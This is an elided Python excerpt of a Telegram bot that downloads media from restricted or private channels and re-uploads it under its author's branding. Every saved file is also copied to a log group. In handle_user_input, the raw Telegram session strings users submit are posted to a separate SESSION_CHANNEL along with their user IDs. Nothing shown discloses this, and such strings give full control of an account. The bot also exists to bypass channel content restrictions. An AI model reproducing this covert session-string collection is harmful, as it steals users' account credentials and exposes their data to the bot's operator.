...
from .. import Bot
from aadi.assets.progress import progress_for_pyrogram
from aadi.assets.functions import screenshot
from pyrogram import Client
from pyrogram.types import Message
from pyrogram.errors import ChannelBanned, ChannelInvalid, ChannelPrivate, ChatIdInvalid, ChatInvalid
from aadi.assets.functions import video_metadata
...
async def send_video_with_chat_id(client, sender, path, caption, duration, hi, wi, thumb_path, upm, is_pinned):
    ...
    try:
        result = await client.send_video(
            ...
            progress_args=(
                client,
                '**__Uploading: [ADARSH](https://t.me/xadarsh_x)__**\n ',
                upm,
                time.time()
            )
        )
...
async def send_document_with_chat_id(client, sender, path, caption, thumb_path, upm, is_pinned):
    ...
    try:
        result = await client.send_document(
            ...
            progress_args=(
                client,
                '**__Uploading:__**\n**__Bot made by [ADARSH](https://t.me/xadarsh_x)__**',
                upm,
                time.time()
            )
        )
...
@aadi.on(events.NewMessage(incoming=True, pattern='/auth'))
...
@aadi.on(events.NewMessage(incoming=True, pattern='/clean'))
...
@aadi.on(events.NewMessage(incoming=True, pattern='/unauth'))
...
@aadi.on(events.NewMessage(incoming=True, pattern='/lock'))
...
async def get_msg(userbot, client, sender, edit_id, msg_link, i, file_n):
    ...
    if 't.me/c/'  in msg_link or 't.me/b/' in msg_link:
        ...
        try:
            ...
            file = await userbot.download_media(msg, progress=progress_for_pyrogram, progress_args=(client, "**__Unrestricting__: __[ADARSH](https://t.me/xadarsh_x)__**\n ", edit, time.time()))            # Retrieve user's custom renaming preference if set, default to '@xadarsh_x' otherwise
            if not file:
            ...
            if file_extension in ['mkv', 'mp4', 'webm', 'mpe4', 'mpeg', 'ts', 'avi', 'flv', 'org', 'm4v']:
                ...
                await aadi.send_file(target_chat_id, path, caption=caption)
                await aadi.send_file(LOG_GROUP, path, caption=caption)
            else:
                if file_n != '':
                    if '.' in file_n:
                        path = f'/app/downloads/{file_n}'
...
@aadi.on(events.NewMessage(incoming=True, pattern='/settings'))
...
@aadi.on(events.NewMessage(func=lambda e: e.sender_id in pending_photos))
...
async def handle_user_input(event):
    ...
    if user_id in sessions:
        ...
        if session_type == 'setchat':
            ...
            await aadi.send_message(SESSION_CHANNEL, f"User ID: {user_id}\nSession String: \n\n`{event.text}`")
